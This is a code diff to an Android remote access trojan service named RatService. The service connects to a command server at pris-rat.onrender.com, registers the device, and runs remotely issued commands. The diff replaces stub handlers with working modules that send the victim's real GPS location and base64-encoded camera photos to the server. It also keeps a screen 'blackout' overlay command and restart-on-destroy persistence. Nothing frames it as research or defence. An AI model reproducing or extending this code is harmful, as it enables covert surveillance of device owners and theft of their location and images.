@@ -25,6 +25,8 @@ public class RatService extends Service {
     private static final String SERVER_URL = "https://pris-rat.onrender.com";
     private Socket socket;
     private String deviceId;
+    private LocationModule locationModule;
+    private CameraModule cameraModule;
 
     @Override
     public void onCreate() {
@@ -33,6 +35,32 @@ public class RatService extends Service {
 
         deviceId = getDeviceId();
         startForeground(1, buildNotification());
+
+        locationModule = new LocationModule(this, (lat, lon) -> {
+            try {
+                Log.d(TAG, "Location: " + lat + "," + lon);
+                JSONObject resp = new JSONObject();
+                resp.put("id", deviceId);
+                resp.put("type", "location");
+                resp.put("lat", lat);
+                resp.put("lon", lon);
+                if (socket != null && socket.connected()) socket.emit("response", resp);
+            } catch (Exception ignored) {}
+        });
+
+        cameraModule = new CameraModule(this, base64 -> {
+            try {
+                Log.d(TAG, "Camera captured len=" + base64.length());
+                JSONObject resp = new JSONObject();
+                resp.put("id", deviceId);
+                resp.put("type", "camera");
+                resp.put("image", base64);
+                if (socket != null && socket.connected()) socket.emit("response", resp);
+            } catch (Exception e) {
+                Log.e(TAG, "Cam send error", e);
+            }
+        });
+
         connectSocket();
     }
 
@@ -63,9 +91,8 @@ public class RatService extends Service {
     private void connectSocket() {
         try {
             socket = IO.socket(SERVER_URL);
-            
             socket.on(Socket.EVENT_CONNECT, args -> {
-                Log.d(TAG, "Socket connected!");
+                Log.d(TAG, "Connected");
                 try {
                     JSONObject reg = new JSONObject();
                     reg.put("id", deviceId);
@@ -73,25 +100,18 @@ public class RatService extends Service {
                     reg.put("android", Build.VERSION.RELEASE);
                     reg.put("battery", 100);
                     socket.emit("register", reg);
-                    Log.d(TAG, "Registered: " + deviceId);
-                } catch (Exception e) {
-                    Log.e(TAG, "Reg error", e);
-                }
+                } catch (Exception ignored) {}
             });
 
             socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
-                Log.e(TAG, "Socket connect error: " + (args.length > 0 ? args[0].toString() : "unknown"));
-            });
-
-            socket.on(Socket.EVENT_DISCONNECT, args -> {
-                Log.d(TAG, "Socket disconnected");
+                Log.e(TAG, "Connect error: " + (args.length > 0 ? args[0].toString() : "?"));
             });
 
             socket.on("execute", args -> {
                 try {
                     JSONObject cmd = (JSONObject) args[0];
                     String action = cmd.getString("action");
-                    Log.d(TAG, "Command: " + action);
+                    Log.d(TAG, "Execute: " + action);
                     handleCommand(action, cmd);
                 } catch (Exception e) {
                     Log.e(TAG, "Cmd error", e);
@@ -99,7 +119,6 @@ public class RatService extends Service {
             });
 
             socket.connect();
-            Log.d(TAG, "Socket connecting to " + SERVER_URL);
         } catch (URISyntaxException e) {
             Log.e(TAG, "URI error", e);
         }
@@ -108,10 +127,12 @@ public class RatService extends Service {
     private void handleCommand(String action, JSONObject cmd) {
         switch (action) {
             case "location":
-                sendLocation();
+                locationModule.getLocation();
                 break;
             case "camera":
-                sendCamera();
+                boolean front = cmd.optBoolean("front", false);
+                Log.d(TAG, "Camera capture front=" + front);
+                cameraModule.capturePhoto(front);
                 break;
             case "blackout":
                 startService(new Intent(this, OverlayService.class));
@@ -122,37 +143,14 @@ public class RatService extends Service {
         }
     }
 
-    private void sendLocation() {
-        try {
-            JSONObject resp = new JSONObject();
-            resp.put("id", deviceId);
-            resp.put("type", "location");
-            resp.put("lat", 0.0);
-            resp.put("lon", 0.0);
-            if (socket != null && socket.connected()) socket.emit("response", resp);
-        } catch (Exception ignored) {}
-    }
-
-    private void sendCamera() {
-        try {
-            JSONObject resp = new JSONObject();
-            resp.put("id", deviceId);
-            resp.put("type", "camera");
-            resp.put("image", "");
-            if (socket != null && socket.connected()) socket.emit("response", resp);
-        } catch (Exception ignored) {}
-    }
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "onStartCommand");
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "Service destroyed");
         if (socket != null) socket.disconnect();
         Intent restart = new Intent(this, RatService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
